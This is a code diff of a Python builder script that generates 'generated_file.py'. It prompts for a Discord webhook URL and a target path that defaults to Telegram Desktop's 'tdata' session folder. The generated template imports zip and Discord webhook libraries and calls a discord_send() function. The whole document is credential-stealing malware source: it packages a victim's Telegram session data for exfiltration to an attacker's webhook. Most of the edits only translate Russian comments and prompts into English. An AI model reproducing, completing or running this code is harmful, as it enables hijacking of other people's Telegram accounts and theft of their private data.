@@ -6,7 +6,8 @@ def create_python_file(hook, user):
 import os
 
 # depencies check
-discord_path = os.path.join(os.path.expanduser('~'), 'AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python311\\\\site-packages\\\\discord_webhook')
+home = os.path.expanduser('~')
+discord_path = os.path.join(home, 'AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python311\\\\site-packages\\\\discord_webhook')
 discord_status = os.path.isdir(discord_path)
 
 for i in range(1):
@@ -21,7 +22,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
 
-user = r'{user}'  # Используем raw строку для пути
+user = r'{user}' 
 hook = "{hook}"
 # sources end
 
@@ -45,27 +46,27 @@ discord_send()
 # discord send end
     """
 
-    # Создание нового файла
+
     with open('generated_file.py', 'w') as f:
         f.write(template)
 
 def main():
-    # Запрашиваем у пользователя данные для переменных
-    hook = input("Введите URL вебхука (hook): ")
 
-    # Путь по умолчанию
+    hook = input("Enter web hook url (hook): ")
+
+
     default_user = r'home, AppData\\Roaming\\Telegram Desktop\\tdata'
     
-    # Запрашиваем у пользователя путь
-    user = input(f"Введите путь к директории пользователя (user) или нажмите Enter для пути по умолчанию [{default_user}]: ")
 
-    # Если пользователь ничего не ввел, используем значение по умолчанию
+    user = input(f"Enter path to tdata or press ENTER for default path [{default_user}]: ")
+
+
     if not user:
         user = default_user
 
-    # Создаем Python файл
+
     create_python_file(hook, user)
-    print("Файл 'generated_file.py' создан!")
+    print("File 'generated_file.py' generated!")
 
 if __name__ == "__main__":
     main()
